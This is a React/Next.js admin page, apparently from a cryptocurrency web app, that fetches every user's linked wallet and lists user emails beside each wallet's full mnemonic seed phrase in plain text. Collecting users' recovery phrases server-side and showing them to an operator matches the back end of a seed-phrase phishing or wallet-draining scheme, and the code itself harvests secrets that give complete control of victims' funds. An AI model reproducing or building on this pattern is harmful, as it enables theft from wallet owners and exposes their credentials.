"use client";

import { useState } from "react";
import { useQuery } from "convex/react";
import { api } from "@/convex/_generated/api";
import type { Doc } from "@/convex/_generated/dataModel";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { DataTable, type DataTableColumn } from "@/components/ui/data-table";
import { Button } from "@/components/ui/button";


type WalletWithUser = Doc<"wallets"> & { userEmail: string };

export default function AdminLinkedWalletsPage() {
  const linkedWallets = useQuery(api.wallet.getWallets);
  const [viewingWallet, setViewingWallet] = useState<WalletWithUser | null>(null);



  const columns: DataTableColumn<WalletWithUser>[] = [
    {
      key: "serial",
      header: "S/N",
      cell: (row, index) => index + 1,
    },
    { key: "userEmail", header: "User", cell: (row) => row.userEmail },
    {
      key: "walletName",
      header: "Wallet Name",
      cell: (row) => row.walletName,
    },
    {
      key: "mnemonic",
      header: "Mnemonic",
      cell: (row) => row.mnemonic.join(" "),
    },
    {
      key: "actions",
      header: "",
      className: "text-right",
      cell: (row) => (
        <Button variant="ghost" size="sm" onClick={() => setViewingWallet(row)}>
          View Wallet
        </Button>
      ),
    },
  ];

  return (
    
    <div className="space-y-6">
      <div>
        <h1 className="font-heading text-2xl font-semibold tracking-tight">Linked Wallets</h1>
        <p className="mt-1 text-sm text-muted-foreground">
          View and Manage Linked Wallets
        </p>
      </div>

    <div>
    <DataTable
            columns={columns}
            data={linkedWallets}
            emptyState="No linked wallets found."
            className="px-4"
          />
    </div>
    </div>
  );
}
